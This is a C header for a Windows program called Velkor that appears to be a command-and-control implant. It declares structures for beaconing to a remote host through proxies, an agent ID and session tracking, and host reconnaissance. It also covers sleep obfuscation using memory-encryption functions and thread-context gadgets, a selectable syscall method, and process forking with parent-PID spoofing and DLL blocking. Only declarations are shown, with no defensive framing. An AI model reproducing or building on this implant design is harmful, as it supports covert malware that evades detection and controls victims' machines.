#ifndef VELKOR_H
#define VELKOR_H

#include <windows.h>
#include <iphlpapi.h>
#include <wininet.h>
#ifdef WINHTTP
#include <winhttp.h>
#endif
#include <stdio.h>
#include <ws2spi.h>

#include <Native.h>
#include <Misc.h>
#include <Ground.h>
#include <Defines.h>
#include <Communication.h>

/*==============[ Main Export ]==============*/

INT Main(
    PVOID Parameter
);

/*==============[ Velkor struct/enum ]==============*/

typedef struct {
    PVOID SystemFunction041;
    PVOID SystemFunction040;
    PVOID NtTestAlert;
    PVOID VirtualProtect;
    PVOID NtWaitForSingleObject;
    PVOID WaitForSingleObjectEx;
    PVOID NtGetContextThread;
    PVOID NtSetContextThread;
    PVOID RtlExitUserThread;
    PVOID RtlCaptureContext;
    PVOID SetEvent;
    D_API( printf );
    D_API( strncmp );
    D_API( RtlAllocateHeap );
    D_API( NtProtectVirtualMemory );
} API;

typedef struct {
    PVOID  Start;
    UINT64 Length;
} MEM_RANGE, *PMEM_RANGE;

typedef struct {
    PPACKAGE Package;
    PWSTR    Host;
    UINT16   Port;
    PWSTR    UserAgent;
    PWSTR    AddHeaders;
    PWSTR    ProxyServers;
    PWSTR    ProxyUserName;
    PWSTR    ProxyPassword;
    BOOL     Secure;
} WEB_INFO, *PWEB_INFO;

typedef struct {
    MEM_RANGE ComputerName;
    MEM_RANGE UserName;
    MEM_RANGE DomainName;
    MEM_RANGE NetBios;
    MEM_RANGE IpAddress;
    MEM_RANGE ProcessorName;
    ULONG     NumberOfProcessors;
    ULONG     TotalRam;
    ULONG     AvalRam;
    ULONG     UsedRam;
    ULONG     UsagePercent;
    ULONG     OsArch;
    ULONG     OsMajorV;
    ULONG     OsMinorV;
    ULONG     ProductType;
    ULONG     OsBuildNumber;
} SYS_INFO, *PSYS_INFO;

typedef struct {
    ULONG SleepTime;
    ULONG Jitter;
    ULONG SleepTechnique;
    PVOID JmpGadget;
    PVOID NtContinueGadget;
} SLEEP_CONF;

typedef struct {
    UINT32   AgentId;
    eSYSCALL SyscallMethod = VelkorWinApi;
    PWSTR    ProcessName;
    PWSTR    ProcessFullPath;
    PWSTR    CommandLine;
    ULONG    ProcessId;
    ULONG    ThreadId;
    ULONG    ParentProcessId;
    ULONG    ProcessArch;
    ULONG    Protected;
    BOOL     Elevated;
    BOOL     Connected;
} SESSION, *PSESSION;

typedef struct {
    WEB_INFO    WebConfig;
    PPACKAGE    PackagePtr;
} COMM_CONF, *PCOMM_CONF;

typedef struct {
    MEM_RANGE Full;
    MEM_RANGE RxPage;
    MEM_RANGE RwPage;
} MEM_VELKOR, *PMEM_VELKOR;

typedef struct {
    PSTR  ProcessFork;
    PSTR  CurrentDir;
    ULONG ParentPid;
    BOOL  BlockDlls;
} FORK, *PFORK;

typedef struct {
    API         FunctionPtr;
    SLEEP_CONF  SleepConfig;
    FORK        ForkConfig;
    PVOID       Module[M_ENUM_SIZE];
    MEM_VELKOR  VelkorMemory;
    SESSION     Session;
    SYS_INFO    System;
    COMM_CONF   CommunicConfig;
    PTEB        Teb;
} VELKOR, *PVELKOR;

#endif // VELKOR_H